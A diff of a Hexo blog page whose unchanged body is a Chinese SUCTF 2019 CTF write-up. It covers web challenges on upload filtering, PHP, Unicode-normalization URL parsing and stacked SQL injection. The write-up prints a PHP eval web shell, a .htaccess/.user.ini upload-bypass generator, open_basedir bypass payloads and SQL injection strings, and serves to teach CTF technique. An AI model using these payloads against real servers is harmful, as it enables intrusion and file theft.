@@ -1,181 +1,224 @@
 <!DOCTYPE html>
-<html lang="">
-
-
-
-
-
+<html lang>
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
-  <meta name="google-site-verification" content="fVesNdKs5rVgSDBf0Af0gVcCtxUVEriFBGLGBH2GH8s">
-  <link rel="apple-touch-icon" sizes="76x76" href="https://s2.ax1x.com/2019/10/30/K5JmBF.png">
-  <link rel="icon" type="image/png" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="description" content="Lethe&#39;s Blog">
-  <meta name="author" content="Lethe">
-  <meta name="keywords" content="Lethe&#39;s Blog">
-  <title>SUCTF_2019_部分复现 ~ Lethe&#39;s Blog</title>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
 
-  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.10.2/css/all.min.css">
-<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
-<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.8.9/css/mdb.min.css">
-<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+    <meta name="author" content="Lethe">
 
 
-  <link rel="stylesheet" href="/lib/prettify/tomorrow.min.css">
-
-<link rel="stylesheet" href="/css/main.css">
+    <meta name="subtitle" content="Life is a struggle">
 
 
-  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+    <meta name="description" content="Lethe's Blog">
+
+
+    <meta name="keywords" content="Lethe's Blog">
+
+
+<title>SUCTF_2019_部分复现 | Lethe&#39;s Blog</title>
+
+
+
+    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
 
 
 </head>
-
-
+<!-- <body background="https://s1.ax1x.com/2020/11/02/Br52e1.jpg"
+      style="background-repeat:no-repeat;
+			 background-size:100% 100%;
+             background-attachment: fixed;"> -->
 <body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">&nbsp;<strong>Lethe's Blog</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/">Home</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/archives/">Archives</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/categories/">Categories</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/tags/">Tags</a>
-          </li>
-        
-          
-          
-          
-          
-          <li class="nav-item">
-            <a class="nav-link" href="/about/">About</a>
-          </li>
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="view intro-2" id="background"
-         style="background: url('https://s2.ax1x.com/2020/03/11/8k84bQ.jpg')no-repeat center center;
-           background-size: cover;
-           background-attachment: fixed;">
-      <div class="full-bg-img">
-        <div class="mask rgba-black-light flex-center">
-          <div class="container text-center white-text fadeInUp">
-            <span class="h2" id="subtitle">
-              
-            </span>
-
-            
-              <br>
-              
-                <p class="mt-3">
-                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>&nbsp;
-                  Monday, August 26th 2019, 5:59 pm
-                </p>
-              
-
-              <p>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
+            <div class="menu navbar-right">
                 
-                  
-                  &nbsp;<i class="far fa-chart-bar"></i>
-                  <span class="post-count">
-                    2.2k 字
-                  </span>&nbsp;
+                    <a class="menu-item" href="/archives">Posts</a>
                 
-
+                    <a class="menu-item" href="/category">Categories</a>
                 
-                  
-                  &nbsp;<i class="far fa-clock"></i>
-                  <span class="post-count">
-                      9 分钟
-                  </span>&nbsp;
+                    <a class="menu-item" href="/tag">Tags</a>
                 
-
+                    <a class="menu-item" href="/about">About</a>
                 
-                  <!-- 不蒜子统计文章PV -->
-                  
-                  &nbsp;<i class="far fa-eye" aria-hidden="true"></i>&nbsp;
-                  <span id="busuanzi_container_page_pv">
-                    <span id="busuanzi_value_page_pv"></span> 次
-                  </span>&nbsp;
-                
-              </p>
-            
-          </div>
-
-          
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
         </div>
-      </div>
-    </div>
-  </header>
+    </nav>
 
-  <main>
     
-      
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <b><a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a></b>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <b><a class="menu-item" href="/archives">Posts</a></b>
+                
+                    <b><a class="menu-item" href="/category">Categories</a></b>
+                
+                    <b><a class="menu-item" href="/tag">Tags</a></b>
+                
+                    <b><a class="menu-item" href="/about">About</a></b>
+                
+            </div>
+        </div>
+    </nav>
 
-<div class="container-fluid">
-  <div class="row">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-md">
-      <div class="py-5 z-depth-3" id="board">
-        <div class="post-content mx-auto" id="post">
-          <div class="markdown-body">
-            <h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>1、进入题目后是一个简单的上传页面：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819172654291.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>先尝试上传普通的图片马，发现会显示<code>&lt;? in contents!</code>，过滤了<code>&lt;?</code>，可以使用<code>&lt;script language=&#39;php&#39;&gt;&lt;/scrip&gt;</code>绕过。</p>
-<p>修改后再次上传发现显示<code>exif_imagetype:not image!</code>，还用了<code>exif_imagetype()</code>进行检验，可以加上GIF89a进行绕过。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173405352.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>但是后缀正则过滤了<code>php</code>字符，想直接绕过是没戏了。</p>
-<p>2、于是考虑解析漏洞，发现服务端不是Apache而是Nginx，所以常见的上传<code>.hatcess</code>文件不可行。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173804810.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <!-- <body style="background-color:rgb(199,237,204);"> -->
+<body style="background-color: RGB(227, 237, 205);">
+<div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">SUCTF_2019_部分复现</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">August 26, 2019&nbsp;&nbsp;17:59:07</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/Writeup/">Writeup</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h1><p>1、进入题目后是一个简单的上传页面：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819172654291.png" alt="在这里插入图片描述"><br>先尝试上传普通的图片马，发现会显示<code>&lt;? in contents!</code>，过滤了<code>&lt;?</code>，可以使用<code>&lt;script language=&#39;php&#39;&gt;&lt;/scrip&gt;</code>绕过。</p>
+<p>修改后再次上传发现显示<code>exif_imagetype:not image!</code>，还用了<code>exif_imagetype()</code>进行检验，可以加上GIF89a进行绕过。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173405352.png" alt="在这里插入图片描述"><br>但是后缀正则过滤了<code>php</code>字符，想直接绕过是没戏了。</p>
+<p>2、于是考虑解析漏洞，发现服务端不是Apache而是Nginx，所以常见的上传<code>.hatcess</code>文件不可行。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173804810.png" alt="在这里插入图片描述"></p>
 <p>参考这篇文章：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p>
 <p>php.ini一定很熟悉了，是php中的配置文件，其中提到了.user.ini文件:</p>
-<p>链接：<a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.changes.modes.php</a><br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174532748.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>链接：<a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.changes.modes.php</a><br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174532748.png" alt="在这里插入图片描述"></p>
 <p>再看一下文档对于.user.ini文件的解释：</p>
 <p>链接：<a href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.file.per-user.php</a></p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174740478.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>简单来说，它起的作用和.htaccess文件差不多，可以通过在目录下增加.user.ini文件来修改一些配置，可以通过.user.ini文件设置除了<code>PHP_INI_SYSTEM</code>以外的所有模式的选项，且不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
-<p>下面就找php.ini中可以利用的配置项，如下:<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819175930926.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>即<code>auto_prepend_file</code>配置项可以指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174740478.png" alt="在这里插入图片描述"><br>简单来说，它起的作用和.htaccess文件差不多，可以通过在目录下增加.user.ini文件来修改一些配置，可以通过.user.ini文件设置除了<code>PHP_INI_SYSTEM</code>以外的所有模式的选项，且不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
+<p>下面就找php.ini中可以利用的配置项，如下:<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819175930926.png" alt="在这里插入图片描述"><br>即<code>auto_prepend_file</code>配置项可以指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</p>
 <p>注：还有一个<code>auto_append_file</code>选项，是在解析后进行包含。</p>
 <p>利用这两个配置项进行包含的前提是含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件。</p>
 <p>4、利用上述配置项进行包含的前提是：含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件。</p>
@@ -192,10 +235,10 @@ auto_prepend_file=shell.jpg
 <p>#define test_width 16</p>
 <p>#define test_height 7</p>
 </blockquote>
-<p>5、成功上传.user.ini文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182711392.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<p>接下来上传包含一句话木马的jpg文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182830861.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>5、成功上传.user.ini文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182711392.png" alt="在这里插入图片描述"></p>
+<p>接下来上传包含一句话木马的jpg文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182830861.png" alt="在这里插入图片描述"></p>
 <p>这样我们上传的文件就被包含在同目录的那个index.php中了，然后连接此文件即可。</p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082723380334.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082723380334.png" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1 id="EasyPHP"><a href="#EasyPHP" class="headerlink" title="EasyPHP"></a>EasyPHP</h1><p>1、进入题目后，源码显示在了页面上：</p>
 <pre><code class="php">&lt;?php
@@ -255,16 +298,16 @@ for($i=0;$i&lt;strlen($argv[1]);$i++)
 }
 echo $payload;
 </code></pre>
-<p>得到：<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022295714.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>得到：<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022295714.png" alt="在这里插入图片描述"></p>
 <p>所以尝试:</p>
 <pre><code>${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo
-</code></pre><p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022373196.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+</code></pre><p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022373196.png" alt="在这里插入图片描述"></p>
 <p>发现成功，于是构造payload：</p>
 <pre><code>${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=get_the_flag
 </code></pre><p>3、接下来就是通过上传来getshell了，这里确实是需要上传<code>.htaccess</code>文件了，绕过方式可以参考这篇文章：<a href="https://www.cnblogs.com/wfzWebSecuity/p/11207145.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/11207145.html</a></p>
 <ul>
 <li>exif_imagetype() 的绕过方式和上面一样</li>
-<li>这里注意到php版本为7.2所以，不能用<code>&lt;script&gt;</code>标签绕过<code>&lt;?</code>的过滤了，可以通过编码进行绕过，如原来使用utf8编码，如果shell中是用utf16编码则可以Bypass<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022585743.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>直接利用脚本生成文件：</li>
+<li>这里注意到php版本为7.2所以，不能用<code>&lt;script&gt;</code>标签绕过<code>&lt;?</code>的过滤了，可以通过编码进行绕过，如原来使用utf8编码，如果shell中是用utf16编码则可以Bypass<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022585743.png" alt="在这里插入图片描述"><br>直接利用脚本生成文件：</li>
 </ul>
 <pre><code class="python">SIZE_HEADER = b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;
 
@@ -292,13 +335,13 @@ generate_htacess()
 generate_php_file(&quot;shell.lethe&quot;, &quot;&lt;?php eval($_GET[&#39;cmd&#39;]); die(); ?&gt;&quot;)
 </code></pre>
 <p>然后利用Postman分别构造上传<code>.htaccess</code>和<code>shell.lethe</code>:</p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232500140.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232500140.png" alt="在这里插入图片描述"></p>
 <p>得到文件路径后，就可以利用<code>shell.lethe</code>执行命令了，但是还需要绕过<code>open_basedir</code>。</p>
 <p>参考：<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2" target="_blank" rel="noopener"><br>从PHP底层看open_basedir bypass</a></p>
 <p>于是构造payload如下：<br><code>?cmd=chdir(&#39;/tmp&#39;);mkdir(&#39;lethe&#39;);chdir(&#39;lethe&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(ini_get(&#39;open_basedir&#39;));var_dump(glob(&#39;*&#39;));</code></p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232541683.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232541683.png" alt="在这里插入图片描述"></p>
 <p>得到flag位置后，最后读取flag即可，payload：<br><code>?cmd=chdir(&#39;/tmp&#39;);mkdir(&#39;lethe&#39;);chdir(&#39;lethe&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(ini_get(&#39;open_basedir&#39;));var_dump(file_get_contents(THis_Is_tHe_F14g));</code></p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232651716.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232651716.png" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1 id="Pythonginx"><a href="#Pythonginx" class="headerlink" title="Pythonginx"></a>Pythonginx</h1><p>进入页面后给了源码：</p>
 <pre><code class="python">@app.route(&#39;/getUrl&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
@@ -327,7 +370,7 @@ def getUrl():
     &lt;!-- Do you know the nginx? --&gt;
 </code></pre>
 <p>这题的出题思路来自于今年BlackHat的一个议题，相关PPT如下：<br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
-<p>其中关于Python的内容如下：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190826233021605.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这里给出altman学长写的一个脚本，用来寻找可用字符：</p>
+<p>其中关于Python的内容如下：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190826233021605.png" alt="在这里插入图片描述"><br>这里给出altman学长写的一个脚本，用来寻找可用字符：</p>
 <pre><code class="python"># coding:utf-8 
 for i in range(128,65537):    
     tmp=chr(i)    
@@ -344,309 +387,131 @@ for i in range(128,65537):
 <li>前面的url部分应该是<code>suctf.cc</code></li>
 <li>还提到了Nginx，Nginx的配置文件目录为：<code>/usr/local/nginx/conf/nginx.conf</code></li>
 </ul>
-<p>跑上述脚本的的时候，其中有一个可利用字符：<br>                <img src="/2019/08/26/SUCTF-2019-部分复现/20190826235708828.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>由此可以想到构造：<code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>（另一种绕过方式是利用<code>ℂ</code>来代替<code>c</code>及进行绕过），这样可以读到flag的位置：</p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827000438451.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>跑上述脚本的的时候，其中有一个可利用字符：<br>                <img src="/2019/08/26/SUCTF-2019-部分复现/20190826235708828.png" alt="在这里插入图片描述"><br>由此可以想到构造：<code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>（另一种绕过方式是利用<code>ℂ</code>来代替<code>c</code>及进行绕过），这样可以读到flag的位置：</p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827000438451.png" alt="在这里插入图片描述"></p>
 <p>最后构造payload：<code>file://suctf.c℆sr/fffffflag</code></p>
 <p><br></p>
 <h1 id="Easysql"><a href="#Easysql" class="headerlink" title="Easysql"></a>Easysql</h1><p>（题目好像出现了不少非预期解，而且比赛过程中甚至泄露了源码…）</p>
-<p>进入页面后，提示要求输入正确的Flag即可获得flag，存在堆叠注入如下，但是过滤了flag。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827224637818.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>进入页面后，提示要求输入正确的Flag即可获得flag，存在堆叠注入如下，但是过滤了flag。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827224637818.png" alt="在这里插入图片描述"></p>
 <p>根据输入的回显大致判断查询语句为：<code>.. POST[&#39;query&#39;]||flag ...</code></p>
 <p><strong>非预期解</strong></p>
-<p>构造payload：<code>*,1</code>，这样拼接后得到：<code>select *,1||flag from Flag</code> ，即可以查出当前表中全部内容。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225003738.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><strong>预期解</strong></p>
+<p>构造payload：<code>*,1</code>，这样拼接后得到：<code>select *,1||flag from Flag</code> ，即可以查出当前表中全部内容。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225003738.png" alt="在这里插入图片描述"><br><strong>预期解</strong></p>
 <p>由于作者没有过滤全，出现了非预期解，而预期解是：通过堆叠注入，设置<code>sql_mode</code>的值为<code>PIPES_AS_CONCAT</code>，从而将<code>||</code>视为字符串的连接操作符而非或运算符。</p>
 <p>所以payload为：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
 <p>这样输出的flag会与1进行拼接，得到：</p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225816413.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225816413.png" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1 id="upload-labs2"><a href="#upload-labs2" class="headerlink" title="upload labs2"></a>upload labs2</h1>
-            <hr>
-          </div>
-          <br>
-          <div>
-            <p>
-            
-              <span>
-                <i class="iconfont icon-inbox"></i>
-                
-                  <a class="hover-with-bg" href="/categories/Writeup">Writeup</a>
-                  &nbsp;
-                
-              </span>&nbsp;&nbsp;
-            
-            
-              <span>
-                <i class="iconfont icon-tag"></i>
-                
-                  <a class="hover-with-bg" href="/tags/Writeup">Writeup</a>
-                
-              </span>
-            
-            </p>
-            
-              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
-            
-          </div>
         </div>
-      </div>
-    </div>
-    <div class="d-none d-lg-block col-lg-2 toc-container">
-      
-  <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
-    <div id="tocbot"></div>
-  </div>
 
-    </div>
-  </div>
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Lethe</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://lethe.site/2019/08/26/SUCTF-2019-部分复现/">https://lethe.site/2019/08/26/SUCTF-2019-部分复现/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/Writeup/"># Writeup</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/09/01/第五空间Writeup-Web/">第五空间Writeup_Web</a>
+            
+            
+            <a class="next" rel="next" href="/2019/08/15/XML实体注入攻击/">XML实体注入攻击</a>
+            
+        </section>
+
+
+    </article>
 </div>
 
-<!-- custom -->
+</body>
 
-
-<!-- Comments -->
-<div class="col-lg-7 mx-auto nopadding-md">
-  <div class="container comments mx-auto" id="comments">
-    
-      <br><br>
-      
-      
-  <div class="disqus" style="width:100%">
-    <div id="disqus_thread"></div>
-    <script>
-      var disqus_config = function () {
-        this.page.url = 'https://lethe.site/2019/08/26/SUCTF-2019-部分复现/';
-        this.page.identifier = '/2019/08/26/SUCTF-2019-部分复现/';
-      };
-      var oldLoad = window.onload;
-      window.onload = function () {
-        var d = document, s = d.createElement('script');
-        s.type = 'text/javascript';
-        s.src = '//' + 'Lethe' + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-      };
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
-        powered by Disqus.</a></noscript>
-  </div>
-
-
-    
-  </div>
-</div>
-
-    
-  </main>
-
-  
-    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
-      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
-    </a>
-  
-
-  
-    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-  
-
-  <footer class="mt-5">
-  <div class="text-center py-3">
-    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
-    <i class="iconfont icon-love"></i>
-    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
-    <br>
-
-    
-  
-    <!-- 不蒜子统计PV -->
-    
-    &nbsp;<span id="busuanzi_container_site_pv">总访问量 
-          <span id="busuanzi_value_site_pv"></span> 次</span>&nbsp;
-  
-  
-    <!-- 不蒜子统计UV -->
-    
-    &nbsp;<span id="busuanzi_container_site_uv">总访客数 
-            <span id="busuanzi_value_site_uv"></span> 人</span>&nbsp;
-  
-  <br>
-
-
-
-    
-
-
-    <!-- cnzz Analytics icon -->
-    
-
-  </div>
-</footer>
-
-<!-- SCRIPTS -->
-<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
